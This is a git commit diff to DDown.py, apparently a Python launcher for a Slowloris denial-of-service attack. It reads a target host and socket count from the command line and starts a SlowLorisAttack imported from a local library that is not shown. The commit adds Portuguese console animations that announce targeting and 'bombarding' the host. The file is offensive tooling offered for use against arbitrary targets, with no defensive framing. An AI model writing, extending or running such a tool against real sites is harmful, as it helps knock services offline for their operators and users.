512b4ed3f50c041ebeb960c2bfd45befdb4f6edd
atl4sl4b <atl4s.l4b@gmail.com>
2023-08-07 05:35:29 +0000

    V 0.2

--- DDown.py
+++ DDown.py
@@ -1,8 +1,12 @@
 #!/usr/bin/env python3
 
-import rich, sys
+import sys
+from time import sleep
+from rich.console import Console
 from lib import HostAddress, SlowLorisAttack
 from lib import logo
+
+console = Console()
 
 try:
   url = HostAddress.from_url(f"http://{sys.argv[1]}")
@@ -11,8 +15,16 @@ try:
 
   dd_attack = SlowLorisAttack(url, sockets_c, silent=True)
 
-
-  dd_attack.start()
+  with console.status(f"[bold blue]Subindo [green]{sys.argv[2]}[/] boots.[/]") as status:
+    sleep(3)
+    console.log(f"[bold green]{sys.argv[2]}[/] Boots prontos!")
+    sleep(1)
+    status.update(status=(f"[bold yellow]Apontando para o alvo [green]{sys.argv[1]}[/][/]"), spinner="bouncingBall", spinner_style="yellow")
+    sleep(3)
+    console.log("Alvo Lockado")
+    sleep(1)
+    status.update(status=(f" [bold magenta]  Bombardeando [bold green]{sys.argv[1]}[/][/]"), spinner="grenade", spinner_style="red")
+    dd_attack.start()
 
 except KeyboardInterrupt:
     print (" Mas já?? :( ")
